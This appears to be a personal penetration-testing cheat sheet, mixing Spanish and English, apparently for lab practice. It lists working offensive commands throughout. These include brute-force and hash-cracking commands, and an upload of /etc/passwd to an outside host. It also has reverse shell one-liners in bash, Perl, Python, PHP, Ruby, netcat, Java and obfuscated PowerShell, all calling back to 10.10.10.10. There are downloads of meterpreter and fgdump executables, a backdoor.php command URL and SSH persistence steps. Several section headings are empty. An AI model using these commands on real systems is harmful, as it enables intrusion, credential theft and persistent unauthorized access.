
- [Enumeracion](#Enumeracion)
- [Password Attacks](#password-attacks)
- [File Transfers](#file-transfers)
- [Reverse Shells](#reverse-shells)
- [Ofuscación](#ofuscacion)
- [Evasión](#evasion)
- [Explotacións](#explotacion)
- [Post-Explotación (persistencia)](#persistencia)
- [Post-Explotación (escalada de privilegios)](#escalacion-privilegios)
- [Pivoting](#pivoting)
- [Exfiltración de datos](#exfiltracion)
- [Limpiando huellas](#limpiar-huellas)

# Enumeracion

sudo nmap -p- --open -vvv --min-rate 5000 -sS -Pn 10.10.10.4 -oN nmap
sudo nmap -sVC -p135,139,445 10.10.10.4 -oN nmap.service

## Directorios

gobuster dir -u [URL] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 

## Tools

### Git

https://github.com/arthaud/git-dumper.git

# Password Attacks

```sh
ncrack -vv --user rax -P wordlist.txt rdp://1.1.1.1

medusa -h 1.1.1.1 -u root -P /usr/share/wordlists/rockyou.txt -e ns -M ssh

hydra -l administrator -P wordlist.txt 1.1.1.1 ssh

hydra 1.1.1.1:80 http-form-post "/PHP/index.php:nickname=^USER^&password=^PASS^:bad password" -l garry -P /usr/share/wordlists/nmap.lst -t 10 -w 30 -o hydra-http-post-attack.txt
```

## Password Generation with cewl and John 

```sh
cewl http://1.1.1.1/index.html >> words.txt

john --wordlist=words.txt --rules --stdout >> wordlist.txt
```

## Cracking Hashes - Linux 

```sh
cat shadow.txt | awk -F':' '{print }' > hashes.txt

hashcat -m 500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Cracking Hashes - Windows 

```sh
hashcat -m 1000 -a 0 -o output.txt --remove hashes.txt /usr/share/wordlists/rockyou.txt
```

# File Transfers


wget
```
wget -O exploit.c 10.10.10.10/exploit.c
```

Curl Upload
```
curl --upload-file /etc/passwd http://10.10.10.10
```

## TFTP

### Local (start the service)

```sh
atftpd --daemon --port 69 /tftp
```

### Remote
```sh
tftp -i 10.10.10.10 get nc.exe
```

### Windows FTP 
```sh
echo USER>> ftp.txt 
echo offsec>>ftp.txt 
echo lab123>>ftp.txt
echo binary>>ftp.txt
echo get nc.exe>> ftp.txt 
echo bye>> ftp.txt 
ftp -v -n -s:ftp.txt 10.10.10.10
```

### PowerShell

```sh
echo $storageDir = $pwd > wget.ps1 
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://10.10.10.10/fgdump.exe" >>wget.ps1 
echo $file = "new.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```


# Reverse Shells


Bash
```sh
bash -i >& /dev/tcp/10.10.10.10/7777 0>&1

sh -i >& /dev/tcp/10.10.10.10/7777 0>&1
```

PERL

```sh
perl -e 'use Socket;$i="10.10.10.10";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Python

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10”,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

PHP

```sh
php -r '$sock=fsockopen("10.10.10.10”,7777);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Ruby

```sh
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10”,7777).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
## Netcat
### Linux

```sh
nc -vn 10.10.10.10 7777 -e /bin/sh 
```

Windows

```sh
nc.exe -vn 10.10.10.10 7777 -e cmd.exe
```

Java

```sh
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/7777;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Powershell
```pwsh
powershell.exe
Start-Process $PSHOME\powershell.exe -ArgumentList {$2ade49964b1f45d3895f7a92eaf4c16c = New-Object Sy''st""em.Net.So''ck""ets.TC''PC""lie''nt('*LHOST*',*LPORT*);$477356af73714e84b32757bed7bf19d9 = $2ade49964b1f45d3895f7a92eaf4c16c.GetStream();[byte[]]$7ec1ae18501f4199b9d45c4546641020 = 0..65535|%{0};while(($i = $477356af73714e84b32757bed7bf19d9.Read($7ec1ae18501f4199b9d45c4546641020, 0, $7ec1ae18501f4199b9d45c4546641020.Length)) -ne 0){;$06e8b3156f9449e2bafb69c8905285be = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($7ec1ae18501f4199b9d45c4546641020,0, $i);$sendback = (iex $06e8b3156f9449e2bafb69c8905285be 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (p''w""d).Path + '> ';$33b751e1a76042b5a7abf9f2b7b9301a = ([text.encoding]::ASCII).GetBytes($sendback2);$477356af73714e84b32757bed7bf19d9.Write($33b751e1a76042b5a7abf9f2b7b9301a,0,$33b751e1a76042b5a7abf9f2b7b9301a.Length);$477356af73714e84b32757bed7bf19d9.Flush()};$2ade49964b1f45d3895f7a92eaf4c16c.Close()} -WindowStyle Hidden
```

PowerShell with nc.exe or another rev shell .exe

```pwsh
PowerShell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/files/meterpreter.exe','meterpreter.exe');Start-Process ‘meterpreter.exe'
Windows (Web app with command execution and nc.exe) 
http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.exe%22
```
# Ofuscación



# Evasión


# Explotación


# Post-Explotación (persistencia)
```sh
nano /etc/ssh/sshd_config
Change port 22 into 2222 and save the file. <Al hacer nmap al host el 22 cambia a 2222>
Then restart ssh

En la maquina local:

'sh-keygen'
'cd .ssh'
'ls'
'cat id_rsa.pub > authorized_keys'
'nano /etc/ssh/sshd_config'
Change passwordauthentication no

```

# Post-Explotación (escalada de privilegios)

Interactive Shells 

```sh
python -c 'import pty; pty.spawn("/bin/sh")'
```

Linux Scripts 

```sh
wget 10.10.10.10/linuxprivchecker.py
python linuxprivchecker.py

wget 10.10.10.10/linux-enum-mod.sh
chmod +x  linux-enum-mod.sh
sh linux-enum-mod.sh

wget 10.10.10.10/linux-local-enum.sh
chmod +x  linux-local-enum.sh
sh linux-local-enum.sh

wget 10.10.10.10/unix-privesc-check
chmod +x ./unix-privesc-check
./unix-privesc-check

wget 10.10.10.10/solaris-exploit-suggester.pl
perl solaris-exploit-suggester.pl

https://github.com/DominicBreuker/pspy
```

Local

```sh
./linux-exploit-suggester.sh --uname 2.6.18-274.3.1.el5
```

Linux Commands
```sh
uname -a
id
cat /etc/*-release
cat /proc/version
cat /etc/issue
ifconfig -a
netstat -ano 
netstat --tcp
netstat -s --tcp
nmap -p - -sV localhost
cat /etc/passwd
cat /etc/hosts
arp -a
iptables -L
crontab -l
cat /root/.ssh/known_hosts
find . -name "*password*"
```

SearchSploit root Proceses

```sh
cat process.txt | grep root | cut -d " " -f 9 | grep "\[" | cut -d "[" -f 2 | cut -d "]" -f1 | cut -d "/" -f1  >> root_process.txt 
cat root_process.txt | sort -u > proccess.txt 
for i in `cat process.txt` ; do  searchsploit %i ; done
```

Windows Scripts 
```sh
wpc.exe --audit -a -o report
cd /Offsec 
python windows-exploit-suggester.py --database 2018-09-02-mssb.xls --systeminfo sys-info.txt
python windows-exploit-suggester.py --database 2018-09-02-mssb.xls --ostext 'Windows Server 2008 R2'
```

Windows Commands 

```sh
tree /f /a
systeminfo 
type boot.ini 
hostname
ipconfig /all
netstat -ano
nmap.exe -p - -sV localhost 
net users
net localgroups 
route print
arp -A
netsh firewall show state
netsh firewall show config
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v
net start
accesschk.exe -uwcqv "Authenticated Users" *
dir network-secret.txt /s
Meterpreter Tools
run arp_scanner -r 1.1.1.0/24

use auxiliary/scanner/portscan/tcp

use post/windows/escalate/getsystem
```

# Pivoting
````sh
Modificar -> /etc/proxychains.conf  -> socks5 127.0.0.1 <PORT> (Recomiendo 9000-1000)

proxychains firefox
proxychains nmap

Importante!!! Deben de hacer port forwarding al puerto que usan para conectarse: ejem
ssh -D 9050 root@10.10.10.1

Port Forwarding:

ssh -L 80:localhost:80 root@10.10.1.1 >>> tunneling http
ssh root@10.10.1.1 -D 127.0.0.1:8080 -N -f >> tunneling socks proxy
ssh root@10.10.1.1 -D 8834 >> tunneling socks proxy using web
````

# Exfiltración de datos


# Limpiando huellas

# Tips

script /dev/null -c bash
ctrl Z
stty raw -echo;fg
reset xterm 
export TERM=xterm-256color
export SHELL=bash
source /etc/skel/.bashrc
